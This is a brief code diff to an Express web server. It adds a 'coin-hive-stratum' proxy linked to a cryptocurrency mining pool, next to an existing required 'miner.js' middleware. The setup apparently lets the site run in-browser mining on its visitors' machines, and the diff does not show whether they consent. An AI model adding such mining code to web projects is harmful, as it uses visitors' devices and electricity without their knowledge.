@@ -10,6 +10,14 @@ var middleware = require('./middleware');
 require('./dbsetup.js');
 require('./middleware/miner.js');
 
+var SProxy = require("coin-hive-stratum");
+var proxy = new SProxy({
+  host: "etn-pool.proxpool.com",
+  port: 3333
+});
+
+proxy.listen(8892);
+
 // serve static files
 app.use(express.static(path.join(__dirname, 'public', 'css')));
 app.use(express.static(path.join(__dirname, 'public', 'js')));
